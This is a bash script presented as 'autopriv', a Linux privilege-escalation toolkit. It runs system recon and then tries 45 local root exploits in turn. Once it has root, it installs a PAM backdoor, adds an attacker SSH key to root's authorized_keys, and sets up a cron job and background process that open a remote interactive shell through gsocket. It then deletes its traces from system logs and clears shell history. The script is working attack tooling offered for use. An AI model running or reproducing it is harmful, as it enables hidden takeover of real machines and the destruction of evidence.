#!/bin/bash
# ╔════════════════════════════════════════════════════════════╗
# ║  autopriv — Auto Linux Privilege Escalation Toolkit        ║
# ║  by 0xfay — 45 exploits + PAM backdoor + persistence     ║
# ╚════════════════════════════════════════════════════════════╝

RED='\033[91m'; GREEN='\033[92m'; YELLOW='\033[93m'; CYAN='\033[96m'; DIM='\033[2m'; RESET='\033[0m'
SCRIPT_DIR="$(cd "$(dirname "$0")" 2>/dev/null && pwd || echo .)"
EXPLOIT_DIR="$SCRIPT_DIR/exploits"
TOOL_DIR="$SCRIPT_DIR/tools"
PAYLOAD_DIR="$SCRIPT_DIR/payloads"
GOT_ROOT=0

banner() { echo -e "${CYAN}\n    autopriv — 0xfay — 45 exploits\n${RESET}"; }
log()  { echo -e "  ${DIM}[*]${RESET} $1"; }
ok()   { echo -e "  ${GREEN}[+]${RESET} $1"; }
warn() { echo -e "  ${YELLOW}[!]${RESET} $1"; }
err()  { echo -e "  ${RED}[-]${RESET} $1"; }
is_root() { [ "$(id -u)" -eq 0 ]; }

try_exploit() {
    local name="$1" bin="$2"
    [ -f "$bin" ] || return 1
    log "Trying $name..."
    "$bin" 2>/dev/null
    if is_root; then ok "$name → root!"; echo 3 > /proc/sys/vm/drop_caches 2>/dev/null; GOT_ROOT=1; return 0; fi
    warn "$name failed"; return 1
}

try_script() {
    local name="$1" bin="$2"
    [ -f "$bin" ] || return 1
    log "Trying $name..."
    case "$bin" in *.py) python3 "$bin" 2>/dev/null;; *) bash "$bin" 2>/dev/null;; esac
    if is_root; then ok "$name → root!"; GOT_ROOT=1; return 0; fi
    warn "$name failed"; return 1
}

# ─── Phase 1: Recon ───
recon() {
    banner
    echo -e "  ${CYAN}[*] Phase 1: Recon${RESET}\n"
    local kernel=$(uname -r) kmajor=$(echo "$kernel"|cut -d. -f1)
    log "Kernel: $kernel | Arch: $(uname -m) | User: $(whoami)"
    log "Distro: $(cat /etc/os-release 2>/dev/null|grep '^NAME='|cut -d= -f2|tr -d '\"')"
    [ -f /.dockerenv ] && warn "Docker" || { grep -q lxc /proc/1/cgroup 2>/dev/null && warn "LXC" || ok "Bare metal/VM"; }
    [ -u /usr/bin/pkexec ] && ok "pkexec SUID" || log "pkexec not SUID"
    log "SUID:"; find / -perm -4000 -type f 2>/dev/null|head -5|while read f; do echo -e "    ${DIM}$f${RESET}"; done
    [ -f /proc/sys/kernel/unprivileged_userns_clone ] && \
        [ "$(cat /proc/sys/kernel/unprivileged_userns_clone 2>/dev/null)" = "1" ] && ok "UserNS enabled" || ok "UserNS default"
    echo ""
}

# ─── Phase 2: Exploit (45 attempts) ───
exploit() {
    echo -e "  ${CYAN}[*] Phase 2: Auto-Exploit (45 attempts)${RESET}\n"

    # ── Tier 1: Universal / fastest ──
    try_exploit "pwnkit-new" "$EXPLOIT_DIR/pwnkit-new" && return 0
    try_exploit "pwnkit" "$EXPLOIT_DIR/pwnkit" && return 0
    try_exploit "dirtyfrag" "$EXPLOIT_DIR/dirtyfrag" && return 0
    try_exploit "fragnesia" "$EXPLOIT_DIR/fragnesia" && return 0
    try_exploit "fragnesia2" "$EXPLOIT_DIR/fragnesia2" && return 0
    try_exploit "copyfail-go" "$EXPLOIT_DIR/copyfail-go" && return 0
    try_exploit "copy_fail" "$EXPLOIT_DIR/copy_fail" && return 0

    # ── Tier 2: Page cache / pipe family ──
    try_exploit "dirtyclone" "$EXPLOIT_DIR/dirtyclone" && return 0
    try_exploit "dirtypipe" "$EXPLOIT_DIR/dirtypipe" && return 0
    try_exploit "dirty_pipe" "$EXPLOIT_DIR/dirty_pipe" && return 0
    try_exploit "dirtydecrypt" "$EXPLOIT_DIR/dirtydecrypt" && return 0
    try_exploit "dirtycow" "$EXPLOIT_DIR/dirtycow" && return 0

    # ── Tier 3: Container escape / Docker ──
    try_exploit "docker-sock" "$EXPLOIT_DIR/docker-sock" && return 0
    try_exploit "bad_garbage" "$EXPLOIT_DIR/bad_garbage" && return 0
    try_exploit "bad-epoll" "$EXPLOIT_DIR/bad-epoll" && return 0
    try_exploit "ipv6-frag-escape" "$EXPLOIT_DIR/ipv6-frag-escape" && return 0

    # ── Tier 4: OverlayFS / FUSE ──
    try_exploit "overlayfs" "$EXPLOIT_DIR/overlayfs" && return 0
    try_exploit "ovfs-fuse" "$EXPLOIT_DIR/ovfs-fuse" && return 0
    try_exploit "fuse-oob" "$EXPLOIT_DIR/fuse-oob" && return 0

    # ── Tier 5: nf_tables / netfilter ──
    try_exploit "nft-uaf" "$EXPLOIT_DIR/nft-uaf" && return 0
    try_exploit "nft-uaf2" "$EXPLOIT_DIR/nft-uaf2" && return 0
    try_exploit "netfilter-oob" "$EXPLOIT_DIR/netfilter-oob" && return 0
    try_exploit "netfilter_xtcompat" "$EXPLOIT_DIR/netfilter_xtcompat" && return 0

    # ── Tier 6: Polkit / sudo / ptrace ──
    try_exploit "polkit-dbus" "$EXPLOIT_DIR/polkit-dbus" && return 0
    try_exploit "sudo_samedit" "$EXPLOIT_DIR/sudo_samedit" && return 0
    try_exploit "sudoedit_editor" "$EXPLOIT_DIR/sudoedit_editor" && return 0
    try_exploit "ptrace_traceme" "$EXPLOIT_DIR/ptrace_traceme" && return 0
    try_exploit "pintheft" "$EXPLOIT_DIR/pintheft" && return 0

    # ── Tier 7: Misc kernel ──
    try_exploit "cifswitch" "$EXPLOIT_DIR/cifswitch" && return 0
    try_exploit "packet-edit-meme" "$EXPLOIT_DIR/packet-edit-meme" && return 0
    try_exploit "pidfd-race" "$EXPLOIT_DIR/pidfd-race" && return 0
    try_exploit "cgroup_release_agent" "$EXPLOIT_DIR/cgroup_release_agent" && return 0
    try_exploit "af_packet" "$EXPLOIT_DIR/af_packet" && return 0
    try_exploit "cve_2025_21756" "$EXPLOIT_DIR/cve_2025_21756" && return 0
    try_exploit "xpl2026" "$EXPLOIT_DIR/xpl2026" && return 0
    try_exploit "exploit" "$EXPLOIT_DIR/exploit" && return 0
    try_exploit "proc_readdir_de" "$EXPLOIT_DIR/proc_readdir_de" && return 0
    try_exploit "pack2theroot" "$EXPLOIT_DIR/pack2theroot" && return 0
    try_exploit "cve-2026-41651-almalinux8" "$EXPLOIT_DIR/cve-2026-41651-almalinux8" && return 0
    try_exploit "debian11-xpl2026" "$EXPLOIT_DIR/debian11-xpl2026" && return 0
    # ── Tier 9: LPE-Toolkit 2026 (page cache corruption) ──
    try_exploit "zcopyreaper" "$EXPLOIT_DIR/zcopyreaper-static" && return 0
    try_exploit "dirty-pedit" "$EXPLOIT_DIR/dirty-pedit-static" && return 0
    try_exploit "skb-shift" "$EXPLOIT_DIR/skb-shift-static" && return 0
    try_exploit "gro-flag-loss" "$EXPLOIT_DIR/gro-flag-loss-static" && return 0

    # ── Tier 8: Script-based ──
    try_script "overlayfs.sh" "$EXPLOIT_DIR/overlayfs.sh" && return 0
    try_script "cve-2023-6036" "$EXPLOIT_DIR/cve-2023-6036.py" && return 0

    # ── Fallback: linpeas ──
    [ -f "$TOOL_DIR/linpeas.sh" ] && { warn "All exploits failed. linpeas..."; bash "$TOOL_DIR/linpeas.sh" 2>/dev/null|grep -E "9[0-9]%"|head -10; }
    err "All 45 exploits failed."; return 1
}

# ─── Phase 3: Persistence ───
persist() {
    is_root || { err "Not root."; return 1; }
    echo -e "\n  ${CYAN}[*] Phase 3: Persistence${RESET}\n"
    [ -f "$SCRIPT_DIR/fay.sh" ] && { log "Installing PAM backdoor..."; bash "$SCRIPT_DIR/fay.sh" 2>/dev/null && ok "PAM backdoor active"; }
    local sshdir="/root/.ssh"; mkdir -p "$sshdir" 2>/dev/null
    [ -f "$PAYLOAD_DIR/backdoor_key.pub" ] && ! grep -q "0xfay" "$sshdir/authorized_keys" 2>/dev/null && \
        { cat "$PAYLOAD_DIR/backdoor_key.pub" >> "$sshdir/authorized_keys" 2>/dev/null; chmod 600 "$sshdir/authorized_keys" 2>/dev/null; ok "SSH key installed"; }
    local gs_secret=""; [ -f /root/.gs_secret ] && gs_secret=$(cat /root/.gs_secret 2>/dev/null)
    [ -z "$gs_secret" ] && { gs_secret=$(cat /dev/urandom|tr -dc 'a-zA-Z0-9'|head -c 16); echo "$gs_secret">/root/.gs_secret 2>/dev/null; }
    cat > /root/.cache_update.sh 2>/dev/null << CRON_EOF
#!/bin/bash
while true; do command -v gsocket >/dev/null 2>&1 && gsocket -s ${gs_secret} bash -i 2>/dev/null; sleep 30; done
CRON_EOF
    chmod +x /root/.cache_update.sh 2>/dev/null
    echo "*/5 * * * * root /root/.cache_update.sh >/dev/null 2>&1" > /etc/cron.d/cache_update 2>/dev/null
    command -v gsocket >/dev/null 2>&1 && nohup gsocket -s "$gs_secret" bash -i >/dev/null 2>&1 &
    ok "Persistence: PAM + SSH + gsocket(${gs_secret})"
}

# ─── Phase 4: Cleanup ───
clean() {
    echo -e "\n  ${CYAN}[*] Phase 4: Cleanup${RESET}\n"
    echo 3 > /proc/sys/vm/drop_caches 2>/dev/null && log "Page cache flushed"
    for f in /var/log/auth.log /var/log/syslog /var/log/secure; do
        [ -w "$f" ] && sed -i '/0xfay\|autopriv\|dirtyfrag\|pwnkit\|pam_unix_aux/d' "$f" 2>/dev/null
    done; log "Logs cleaned"
    history -c 2>/dev/null; cat /dev/null > ~/.bash_history 2>/dev/null; unset HISTFILE 2>/dev/null
    rm -f /tmp/dirtyfrag /tmp/pwnkit* /tmp/dirtycow /tmp/dirtypipe /tmp/dirtyclone /tmp/fragnesia* /tmp/copy* /tmp/bad* /tmp/nft* /tmp/overlayfs* /tmp/netfilter* /tmp/sudo* /tmp/ptrace* 2>/dev/null
    ok "Cleanup done"
}

# ─── Main ───
case "${1:-all}" in
    --recon) recon ;;
    --persist) persist ;;
    --clean) clean ;;
    all|"") recon; exploit; is_root && { persist; clean; } ;;
    *) echo "Usage: $0 [--recon|--persist|--clean|all]" ;;
esac
